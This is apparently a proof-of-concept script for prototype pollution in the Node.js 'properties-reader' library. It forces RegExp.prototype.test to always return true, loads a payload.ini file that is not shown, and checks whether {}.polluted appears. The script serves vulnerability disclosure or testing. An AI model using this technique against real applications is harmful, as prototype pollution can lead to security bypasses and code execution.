RegExp.prototype.test = () => true;
const propertiesReader = require('properties-reader');
const path = require('path');
console.log({}.polluted);
propertiesReader(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);